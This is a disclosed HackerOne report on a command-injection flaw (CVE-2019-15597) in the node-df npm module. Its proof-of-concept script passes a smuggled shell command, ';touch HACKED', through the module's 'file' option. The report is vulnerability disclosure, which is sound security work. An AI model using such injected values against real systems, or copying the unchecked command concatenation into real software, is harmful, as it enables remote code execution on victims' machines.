# [H] [node-df] RCE via insecure command concatenation

## Summary
Severity: High (CVSS 8.4)
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: mik317
State: resolved
Disclosed: 2019-12-04T19:33:22.380Z
CVE: CVE-2019-15597
Source: https://hackerone.com/reports/703412

## Details
I would like to report a `RCE` issue in the `node-df` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `node-df`
**version:** `0.1.4`
**npm page:** `https://www.npmjs.com/package/node-df`

## Module Description
> node-df (abbreviation of disk free) is a cross-platform Node.js wrapper around the standard Unix computer program, df.

## Module Stats
[N/A] downloads in the last day
[3,023] downloads in the last week
[N/A] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is concatenated inside a `command` that will be executed without any check. The issue arises here: 

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var df = require('node-df');
var options = {
        file: '/;touch HACKED',
        prefixMultiplier: 'GB',
        isDisplayPrefixMultiplier: true,
        precision: 2
    };
 
df(options, function (error, response) {
    if (error) { throw error; }
 
    console.log(JSON.stringify(response, null, 2));
});
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/703412_
